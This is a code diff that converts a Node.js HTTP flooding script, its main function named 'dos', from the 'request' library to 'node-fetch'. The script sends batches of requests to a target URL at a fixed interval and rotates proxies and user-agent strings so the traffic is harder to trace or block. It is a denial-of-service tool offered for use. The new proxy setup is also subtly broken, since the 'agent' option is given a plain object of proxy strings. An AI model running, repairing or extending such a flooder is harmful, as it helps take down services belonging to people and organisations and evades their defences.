@@ -1,4 +1,4 @@
-const req = require('request');
+const fetch = require('node-fetch'); // Import node-fetch
 const fs = require('fs');
 
 function readProxies() {
@@ -34,46 +34,46 @@ let currentProxyIndex = 0;
 let currentUserAgentIndex = 0;
 
 const dos = (url, qty, ms) => {
-  let err = 0,
-    ok = 0;
+  let err = 0, ok = 0;
   let counter = 1;
   let statusCodes = {};
 
-  setInterval(() => {
+  setInterval(async () => {
     for (let i = 0; i < qty; i++) {
       const options = {
-        url,
-        proxy: `http://${proxies[currentProxyIndex]}`,
+        method: 'GET',  // Specify the request method (GET, POST, etc.)
+        agent: {        // Set up the proxy agent
+          http: proxies[currentProxyIndex] ? `http://${proxies[currentProxyIndex]}` : null,
+          https: proxies[currentProxyIndex] ? `http://${proxies[currentProxyIndex]}` : null
+        },
         headers: {
           'User-Agent': userAgents[currentUserAgentIndex]
         },
-        timeout: 5000 // Set a timeout to avoid hanging requests
+        timeout: 5000 
       };
 
       currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
       currentUserAgentIndex = (currentUserAgentIndex + 1) % userAgents.length;
 
-      req(options, (error, response) => {
-        if (error) {
-          err++;
-        } else {
-          ok++;
-          const statusCode = response.statusCode;
-          statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
-        }
+      try {
+        const response = await fetch(url, options); 
+        ok++;
+        statusCodes[response.status] = (statusCodes[response.status] || 0) + 1;
+      } catch (error) {
+        err++;
+      }
 
-        // Log results after each request
-        const statusCodesString = Object.entries(statusCodes)
-          .map(([code, count]) => `${code}: ${count}`)
-          .join(', ');
-        console.log(
-          `${counter}: ${url} ${ok} ${err} Status Codes: ${statusCodesString}`
-        );
+      // Log results after each request
+      const statusCodesString = Object.entries(statusCodes)
+        .map(([code, count]) => `${code}: ${count}`)
+        .join(', ');
+      console.log(
+        `${counter}: ${url} ${ok} ${err} Status Codes: ${statusCodesString}`
+      );
 
-        counter++;
-        err = ok = 0;
-        statusCodes = {};
-      });
+      counter++;
+      err = ok = 0;
+      statusCodes = {};
     }
   }, ms);
 };
